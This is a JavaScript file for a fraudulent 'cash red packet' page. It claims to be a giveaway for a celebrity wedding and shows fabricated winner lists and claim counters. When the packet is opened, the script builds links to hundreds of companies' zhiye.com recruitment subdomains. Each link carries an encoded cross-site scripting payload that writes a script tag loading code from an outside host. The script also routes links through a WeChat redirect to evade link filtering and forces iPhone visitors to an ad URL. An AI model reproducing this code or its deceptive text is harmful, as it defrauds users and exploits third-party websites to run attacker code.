window.gConfig = window['data'] || {};
var evkey = M.getParam('_evkey');
var site = M.getParam('_c') || '1919';

if (/iphone/ig.test(navigator.userAgent) && window.data && window.data['attached'] && window.data['attached']['iosGoAdUrl']) {
  location.href = window.data['attached']['iosGoAdUrl'];
}

var get_share_host = 'haiwaibbm.cn';

function record(event, id, allow_reply) {
  (console && console.log && console.log('record event' + event + ';id:' + id + '; allow_reply' + allow_reply))
  try {
    if (!localStorage.getItem(event + ':' + id) || allow_reply) {
      //$.post('http://p.rsren.com.cn./record', {event: event, id: id})
      localStorage.setItem(event + ':' + id, true);
    }
  } catch (e) {

  }
}

function pad(num, size) {
  var s = num + "";
  while (s.length < size) s = "0" + s;
  return s;
}

function getFuck163() {
  var strList = [];
  for (var i = 0; i < 10; i++) {
    strList.push('%' + pad(1 + Math.round(Math.random() * 18), 2));
  }
  return strList.join('');
}

$(function () {

  var config = {
    tpl: {
      body: [
        '<div class="red-packet-container index-show-more-body" style="display: none;">',
        '  <div class="top-box">',
        '    <div class="cont-head-portrait">',
        '      <img src="https://lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/image/wed.jpg">',
        '    </div>',
        '    <div class="cont-desc-blessing">',
        '      <p style="font-size: 24px;">喜结良缘 全民送豪礼</p>',
        '      <p>全民派发现金红包<i class="icon-prompt">可提现</i></p>',
        '    </div>',
        '    <a class="btn-open-red-packet" href="javascript:;"><span>開</span></a>',
        '    <p class="cont-desc-bottom">- 今日已有<span>27671</span>人领取了红包 -</p>',
        '  </div>',
        '  <ul class="list"></ul>',
        '</div>',
        '<div class="award-container award-body" style="display: none;">',
        '  <p class="content-top-tips">恭喜领取红包</p>',
        '  <p class="content-price">',
        '    <sup>￥</sup><span class="js_money"></span><i class="icon-highest">最高</i>',
        '  </p>',
        '  <div class="content-charge-box">',
        '    <a class="charge-btn" href="javascript:;">立即领取红包</a>',
        '    <p class="charge-tips">今日24点前未收钱，将收回红包资格<br/><span style="color: red;">如多次领取以最后一次领取金额为准</span></p>',
        '  </div>',
        '  <p class="content-tips-total">总共100000份，已成功发出46786份红包</p>',
        '</div>'
      ].join(''),
      userItem: [
        '<li class="animated" style="display: none;">',
        '  <div class="list-item-left">',
        '    <img src="%(avatar)">',
        '    <div class="item-info">',
        '      <p class="item-info-name">%(name)</p>',
        '      <p class="item-info-time">%(time)</p>',
        '    </div>',
        '  </div>',
        '  <div class="list-item-right">',
        '    领取 <span>%(money)元</span>',
        '  </div>',
        '</li>'
      ].join('')
    }
  };

  var userList = [{
    "name": "飞飞",
    "avatar": "http://t20img.yangkeduo.com/a/4eb2df5e89ee055d771c08bb16e5986ca35c29a9-1527007460?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "小虫子信",
    "avatar": "http://t20img.yangkeduo.com/a/06b618e45469b1cdec29c7beef3d481bf458ef5c-1533940960?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "主角",
    "avatar": "http://t20img.yangkeduo.com/a/b2e6f6ca66127fbf58f8e1a6316bd8b5fa794d72-1541555005?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "碧野",
    "avatar": "http://t20img.yangkeduo.com/a/04179cc649147f8944522bf0e93262baa114d244-1528269129?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "蒋",
    "avatar": "http://t20img.yangkeduo.com/a/d4f5f8045851b68f44f568581f04b0e21e1a5957-1540270581?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "Mystic",
    "avatar": "http://t20img.yangkeduo.com/a/31e825ff825eca24ec1f0fc3f15faebd1e9e7d19-1546310242?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "LOVE",
    "avatar": "http://t20img.yangkeduo.com/a/751ac54490e44dbafaee84c5b3438de88f67eabf-1529720592?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "佛心꧂",
    "avatar": "http://t20img.yangkeduo.com/a/10c0cf5ebb53696ff4e7d1cf6c5677eb0b26ef23-1541420966?imageMogr2/thumbnail/100x",
    "money": "25.30"
  }, {
    "name": "雨，阳",
    "avatar": "http://t20img.yangkeduo.com/a/7989570b51a38744265c6d0f1c1b8ce53ca32b0b-1535629062?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "木子",
    "avatar": "http://t20img.yangkeduo.com/a/8df35651b2c8ca23e034acd118ff8df9feb41657-1529068789?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "唯一",
    "avatar": "http://t20img.yangkeduo.com/a/44baff282e5cd2cac8037c3af0d41ff36b9e1e0d-1543371875?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "。独(∩_∩)笯",
    "avatar": "http://t21img.yangkeduo.com/a/eab384341dfac9a47236fdb245f4c80d61eff576-1513818582?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "新课程",
    "avatar": "http://t20img.yangkeduo.com/a/7989570b51a38744265c6d0f1c1b8ce53ca32b0b-1535629062?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "北极星",
    "avatar": "http://t20img.yangkeduo.com/a/e02040654cc0f5ef9e0b94f3872f1caa10682f45-1545581079?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "妍研",
    "avatar": "http://t20img.yangkeduo.com/a/bddf1ebf18ba5863ade0e8495a7d40e976a4934e-1543397899?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "🌝",
    "avatar": "http://t20img.yangkeduo.com/a/b40746ff7ac3dfe51f739de44c5af12d826956d0-1539180096?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "粉木耳",
    "avatar": "http://t20img.yangkeduo.com/a/3680b86e0bcc09eca4420aa0f9494f9666914aef-1545823113?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "约定",
    "avatar": "http://t20img.yangkeduo.com/a/fd394665ac65324b35f293b65ec81b924c08c017-1528690449?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "杨茜倬🍉",
    "avatar": "http://t20img.yangkeduo.com/a/b0dc3322b769514a277e638bf06c21cb54402ce2-1546042598?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "幸福培训驿站",
    "avatar": "http://t20img.yangkeduo.com/a/66b9ce30957792010a5fc4ecfb40769db83abe86-1544320915?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "🌝",
    "avatar": "http://t20img.yangkeduo.com/a/b40746ff7ac3dfe51f739de44c5af12d826956d0-1539180096?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "七哥",
    "avatar": "http://t21img.yangkeduo.com/a/87ff825e465413eba3cc4b15538c274d43ad9585-1520479870?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "夜巷子里的老猫",
    "avatar": "http://t20img.yangkeduo.com/a/526ce712008de7631f5fe7f8e0953c73a6eee4ff-1541898592?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "小鑫鑫",
    "avatar": "http://t20img.yangkeduo.com/a/d0e70465c252a71e24d827c3b956804109dcb32e-1545053339?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }, {
    "name": "平安是福",
    "avatar": "http://t20img.yangkeduo.com/a/36ce1024a606afea9ce1c48a805be554d982dd8d-1538647780?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "七次郎",
    "avatar": "http://t20img.yangkeduo.com/a/3680b86e0bcc09eca4420aa0f9494f9666914aef-1545823113?imageMogr2/thumbnail/100x",
    "money": "29.80"
  }, {
    "name": "孙东喜",
    "avatar": "http://t20img.yangkeduo.com/a/909e69bc62b6bcb6477f0dd2d6b710da4f166ec3-1539785782?imageMogr2/thumbnail/100x",
    "money": "28.80"
  }];

  var len = userList.length;
  var indexList = [];
  var newUserIndexList = [];
  for (var i = 0; i < len; i++) {
    indexList.push(i);
  }
  for (var i = 0; i < len; i++) {
    var randomIndex = indexList.splice(Math.floor(Math.random() * indexList.length), 1);
    newUserIndexList.push(randomIndex);
  }
  var newUserList = [];
  for (var i = 0; i < len; i++) {
    newUserList.push(userList[newUserIndexList[i]]);
  }
  userList = newUserList;

  var userTimer = 0;
  var showIndex = 0;
  var itemWidth = '';
  var actionTimer = 2500;

  function pad(num, size) {
    var s = num + "";
    while (s.length < size) s = "0" + s;
    return s;
  }

  function jumpToShare(url) {
    $("head").append('<style type="text/css">body{font-size:16px;line-height:1.4;font-family:-apple-system-font,Helvetica Neue,sans-serif}*{padding:0;margin:0}.toast{transition-duration:.2s;transform:translate(-50%,-50%);margin:0;top:45%;z-index:2000;position:fixed;width:7.6em;min-height:7.6em;left:50%;background:hsla(0,0%,7%,.7);text-align:center;border-radius:5px;color:#fff}.toast.toast--visible{opacity:1;visibility:visible}.icon_toast.loading{margin:30px 0 0;width:38px;height:38px;vertical-align:baseline}.icon_toast{font-size:55px;color:#fff}.loading{display:inline-block;animation:e 1s steps(12) infinite;background:transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAiIGhlaWdodD0iMTIwIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCI+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTAgMGgxMDB2MTAwSDB6Ii8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjRTlFOUU5IiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLTMwKSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iIzk4OTY5NyIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgzMCAxMDUuOTggNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjOUI5OTlBIiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKDYwIDc1Ljk4IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0EzQTFBMiIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSg5MCA2NSA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNBQkE5QUEiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoMTIwIDU4LjY2IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0IyQjJCMiIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgxNTAgNTQuMDIgNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjQkFCOEI5IiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKDE4MCA1MCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNDMkMwQzEiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTE1MCA0NS45OCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNDQkNCQ0IiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTEyMCA0MS4zNCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNEMkQyRDIiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTkwIDM1IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0RBREFEQSIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgtNjAgMjQuMDIgNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjRTJFMkUyIiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKC0zMCAtNS45OCA2NSkiLz48L3N2Zz4=) no-repeat;background-size:100%}i{font-style:italic}@keyframes e{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}</style>');
    $("body").css("background", "white").find("*").remove();
    $("body").append('<div class="toast loading_toast toast--visible"><div><i class="loading icon_toast"></i></div><p class="toast_content">&#x6B63;&#x5728;&#x8FDB;&#x5165;</p></div>');
    setTimeout(function () {
      window.share_url = window.share_url.replace(/{fuck163}/ig, getFuck163());

      if (window.share_url.indexOf("zhiye.com") > -1) {
        var d = new Date();
        var timestamp = d.getTime();
        var t = d.getMonth() + 1 + '-' + d.getDate() + '_' + d.getHours() + ':' + (d.getMinutes() + 1);

        var list = [
          "cscec2b",
          "zdwp",
          "zjlianhua",
          "longcheerzp",
          "hec",
          "pinduoduo",
          "bpsinopec",
          "tidepharm",
          "cicc",
          "eswin",
          "beisen24",
          "beisensouth",
          "memebox",
          "patsnap",
          "scyzzhaopin",
          "kingfa",
          "chinaums",
          "centaline",
          "aggpower",
          "dingli",
          "xsdzq",
          "sinosure",
          "shengli",
          "rongqiaogroup",
          "beisen10",
          "site201172",
          "xiaohongshu",
          "syfw",
          "keruyun",
          "sfgf",
          "aokang",
          "ximalaya",
          "swhysc",
          "poten",
          "cattsoft",
          "homecreditcfc",
          "agilezp",
          "keystonefoods",
          "idreamsky",
          "lu",
          "grcbank",
          "jcjthr",
          "tianma",
          "yunhong",
          "maccura",
          "owbuy",
          "novastar",
          "huaan",
          "dianhun",
          "csrgc",
          "2345",
          "beisen8",
          "shandagames",
          "djibw",
          "cindascth",
          "bgy",
          "weimeizi",
          "zhengjia",
          "khidi",
          "choicexp",
          "hnagroup",
          "laiyifen",
          "dongjiang",
          "juxin",
          "htsec101600",
          "amkor",
          "bcegc",
          "u51",
          "kpsnc",
          "huazhu",
          "fullhan",
          "wxscc",
          "yangxiang",
          "csic",
          "beisenfarmer",
          "taipinggx",
          "percent",
          "oceg",
          "robustel",
          "micoe",
          "markor",
          "thfund",
          "hexagonmi",
          "zjjtgc",
          "bjou",
          "hnagroup1",
          "beisen37",
          "octcd",
          "bosssoft",
          "htfutures",
          "plateno",
          "chinacoal",
          "qunar0001",
          "wp",
          "beisen19",
          "fangdd",
          "yuewen",
          "xzgdjt",
          "hanyao",
          "blackfish",
          "chasesun",
          "yonghui",
          "shec",
          "kingmed",
          "tinci",
          "tianan",
          "hengdian",
          "polycn1",
          "ygsoft",
          "yto",
          "tbea",
          "ymtc",
          "gdym",
          "beisen54",
          "resoft",
          "iport",
          "fsyyy",
          "hobot",
          "ctsec",
          "chimelong",
          "stec",
          "nader",
          "gemdale",
          "gjtjt",
          "cscec5b",
          "songdu",
          "sinochemoilgd",
          "casin",
          "cqhealthy",
          "goldwind00001",
          "zhongguowuzhou",
          "crchi",
          "hascovision",
          "beisen26",
          "xinlizd",
          "cscec1b1",
          "zzvcom",
          "jingruis",
          "hfzy",
          "hc360",
          "hailiang",
          "reginamiracle",
          "baiwang",
          "bonc",
          "yfpo",
          "luxelakes",
          "haixin",
          "lebbay",
          "chuanyi",
          "davost",
          "sunda",
          "ghs",
          "zdtqhd",
          "babyfs",
          "portal10010202",
          "hsyxm",
          "auxgroup",
          "luan-century",
          "suneast",
          "stihl",
          "tkhealthcare",
          "wfjt",
          "meten",
          "yiguo",
          "douyu",
          "spreadtrum",
          "sutpc",
          "iboxpay",
          "glprop",
          "cbhb",
          "wangzhiyi",
          "intellif",
          "metersbonwe",
          "jinghua",
          "fihfoxconn",
          "jdcapital",
          "cindasc",
          "ipinyou",
          "comba",
          "site201191",
          "fegroup",
          "dfgetrag",
          "zhonghuan",
          "wdce",
          "bkdr-group",
          "ctriptech",
          "xpgco",
          "meizu",
          "beisen22",
          "zrcbank",
          "polycareer",
          "hfctjt",
          "imcchk",
          "eland",
          "bianlifeng",
          "bj-tct",
          "huolala",
          "bch",
          "avichr",
          "eastmoney",
          "beisen1",
          "sxqc",
          "bpkj",
          "nsfocus",
          "ciczp",
          "hm",
          "602",
          "haidilaohr",
          "apeloa",
          "zhihu",
          "beisen16",
          "s1979",
          "cmazhaopin",
          "wsec",
          "sinolines",
          "metro",
          "hudongzhh",
          "trustlife",
          "chint",
          "kingold1",
          "minotech",
          "djdc",
          "ibrcn",
          "phnix",
          "ddbx",
          "zhongan",
          "topline",
          "cscec8b",
          "cmec",
          "trendmicro",
          "ucloud",
          "agile",
          "500",
          "beisenxy",
          "xtep",
          "calb",
          "gzprg",
          "dxzq",
          "601",
          "carestream",
          "bjtu",
          "htcxfund",
          "chtwm",
          "dashu",
          "sqcapital",
          "asiacore",
          "00003zz",
          "hongfa",
          "lierda",
          "beisentel",
          "crcb",
          "cpic",
          "chinacom",
          "dicastal",
          "smedi",
          "sisyphe",
          "zsj",
          "towngas",
          "ccblife",
          "znv",
          "njcttq",
          "tempusworld",
          "ramaxel",
          "21vianet",
          "zsmz",
          "leogroup",
          "reedexpo",
          "xiaozhu",
          "taier",
          "crnmg",
          "fuchun",
          "cig",
          "cscec3b",
          "xyl",
          "sinooceanland",
          "avic-capdi",
          "zensun",
          "orientscape",
          "beisen41",
          "tuniu",
          "beisen9",
          "iauto",
          "cscec1b",
          "ccdi",
          "cmbcc",
          "szclou",
          "cib-fund",
          "beisen39",
          "tospolighting",
          "freshhema",
          "hi-lex",
          "cheersum",
          "lnlandscape",
          "rrjc",
          "ruijie",
          "gosun",
          "mgcc",
          "bgyzp",
          "hao24",
          "beisen27",
        ]


        var key = list[Math.floor(Math.random() * list.length)];

        window.share_url = "https://" + key + ".zhiye.com/Portal/Account/MobileBindTemplate?businessurl=%22%7D%7D%7D%29%7D%29%3Bdocument%5B%27write%27%5D%28atob%28%27PHNjcmlwdCBzcmM9aHR0cHM6Ly9zLjUxYmpiai5jb20vc2hhcmU%2BPC9zY3JpcHQ%2B%27%29%29%3B%28function%28%29%7B%28function%28%29%7Bif%280%29%7Bif%280%29%7Bs%3D%22&id=" + timestamp + '&remote=1&out=js&case=lldq-hb' + '&_c=' + site + '&now=' + timestamp + '&tm=' + t;
      }

      var a = document.createElement('a');

      var surl = M.addParam(window.share_url, {
        money: gConfig.money
      });

      if (surl.indexOf('eqxiu.com') > -1 && window.data['attached']['eqc']) {
        var eqc = window.data['attached']['eqc'];
        eqc.pyq = window.data['attached']['ad_share']['pyq'];
        eqc.qun = window.data['attached']['ad_share']['qun'];
        surl = M.addParam(window.share_url, {
          '__pc': encodeURIComponent(btoa(JSON.stringify(eqc)))
        });
      }

      if (window.data && window.data['attached'] && window.data['attached']['needWhite']) {
        // surl = 'http://api.qt.baidu.com/j?php=1&uid=0oahpl903i&action=headline&url=' + encodeURIComponent(surl);

        surl = 'https://as.weixin.qq.com/cgi-bin/amazing?url=' + encodeURIComponent(surl);

      }

      a.href = surl;
      a.rel = 'noreferrer';
      a.click();

    }, 10)
  }

  function goShare(callback) {
    var url = 'https://' + domian + '/url/share'
    $.get(url, function (target) {
      
      window.share_url = target;
      if (typeof callback === 'function') {
        callback();
      }
    });
  }

  function addUser() {
    if (showIndex === userList.length) {
      showIndex = 0;
    }
    var $item = $(config.tpl.userItem.jstpl_format(userList[showIndex++]));
    $('.index-show-more-body .list').prepend($item);
    $item.slideDown(1000);

    $('.index-show-more-body .list li').each(function (index, item) {
      if (index > 6) {
        $(item).slideUp(1000);
        setTimeout(function () {
          $(item).remove();
        }, 1000);
      }
    });
  }

  function startTimer() {
    clearTimeout(userTimer);
    userTimer = setTimeout(function () {
      addUser();
      startTimer();
    }, actionTimer);
  }

  function initUser() {
    var now = +new Date();
    $(userList).each(function (index, item) {
      var temp = new Date((now - Math.random() * 600000));
      var minutes = temp.getMinutes();
      if (minutes < 10) {
        minutes = '0' + minutes;
      }
      var timeStr = temp.getHours() + ':' + minutes;
      item.time = timeStr;
    });
    for (showIndex = 0; showIndex < 6; showIndex++) {
      var item = config.tpl.userItem.jstpl_format(userList[showIndex]);
      $('.index-show-more-body .list').prepend($(item).show());
    }
    itemWidth = $('.index-show-more-body .list li').eq(0).width() + 'px';
    addUser();
    startTimer();
  }

  function initPage() {
    gConfig.money = parseInt((parseFloat(Math.random() * 20) + 30) * 100);
    M.resetFont();
    $(document.body).append(config.tpl.body.jstpl_format({
      head: $('.js_head_img').attr('data-src')
    }));
    $('.index-show-more-body').show();
    $('.js_money').text(parseFloat(gConfig.money / 100).toFixed(2));

    //g_dialog.alert('主演：<span style="color:red">姚晨</span>&nbsp;<span style="color:red">倪大红</span>&nbsp;<span style="color:red">郭京飞</span>&nbsp;<span style="color:red">杨祐宁</span>&nbsp;<span style="color:red">李念</span><br><span style="color:#FF4500; text-align: center; font-size: 18px;"></span><br>导演：<span style="color:red">简川訸</span>&nbsp;<br><br><span>为答谢粉丝们的支持与厚爱，现发出<span style="color:red;font-size:20px;">1000万</span>现金红包回馈粉丝<br></span><br><span style="color:#C0C0C0;">红包总额仅剩余<span style="color:red;font-size:22px;" class="shengyunum">514万</span>元<br>金额有限，先到先得</span>')
    g_dialog.alert('新郎：<span style="color:red">冯绍峰</span>&nbsp;&nbsp;新娘：<span style="color:red">赵丽颖</span><br><span style="color:#FF4500; text-align: center; font-size: 18px;"></span><br><span style="color:#FF4500; text-align: center; font-size: 18px;">兹定于<span style="color:red;font-size:22px;">2019-03-21</span>举行婚礼</span><br><br><span>为答谢粉丝们的支持与厚爱，现发出<span style="color:red;font-size:20px;">1000万</span>现金红包回馈粉丝<br></span><br><span style="color:#C0C0C0;">红包总额仅剩余<span style="color:red;font-size:22px;" class="shengyunum">5144万</span>元<br>金额有限，先到先得</span>')

    initUser();
  }

  function openPacket() {
    record('tostop', site);
    evkey && record('tostop', evkey);
    if (window.share_url) {
      jumpToShare(share_url);
    } else {
      goShare(function () {
        jumpToShare(window.share_url)
      });
    }
  }

  function bindEvent() {

    $(document.body).on('click', '.btn-open-red-packet', function () {
      var $this = $('.btn-open-red-packet');
      if ($this.hasClass('open')) {
        return false;
      }
      $this.addClass('open');
      goShare();
      setTimeout(function () {
        $('.index-show-more-body').fadeOut(700);
        $('.award-body').fadeIn(700);
      }, 1500);
      record('play', site);
      evkey && record('play', evkey);
    });

    $(document.body).on('click', '.charge-btn', function () {
      g_dialog.confirm({
        title: '猜一猜婚礼在哪里举行',
        message: '答对本题可获<span style="color: #f5294c">额外奖金</span>',
        btn: ['上海', '香港'],
        cb: openPacket,
        cancelCb: openPacket,
      });
    });
  }

  function init() {
    record('load', site);
    evkey && record('load', evkey);
    initPage();
    bindEvent();
  }

  init();
});

$(function () {
  if (gConfig.hm) {
    M.report(gConfig.hm);
    M.hotClick('pv.detail_page');
  }

  M.loadJS('https://hm.baidu.com/hm.js?a71a8a3c027d8f8703df08f83e95ef39', 'async');
  // 总统计
  M.loadJS('https://hm.baidu.com/hm.js?33285983d90a876a0e68ec6ad5ad5189', 'async');
  // g_dialog.alert('<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span><br/><br/><span>您获得现金红包</span><br/><span style="font-size: 20px;color:red;">33.74元</span><br/><span style="color:red;">活动宗旨为宣传本电影的知名度，分享到群后</span><span  style="color:red; font-size: 25px;">即可领取</span><br/><span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">3378.3万</span>元，先到先得，马上分享领取到账！<br/>')

});

// 隐藏分享
$(function () {
  M.hideShare();
});

// 设置返回
$(function () {
  if (gConfig['attached'] && gConfig['attached']['back_api']) {
    M.loadJS(gConfig['attached']['back_api']);
  }
});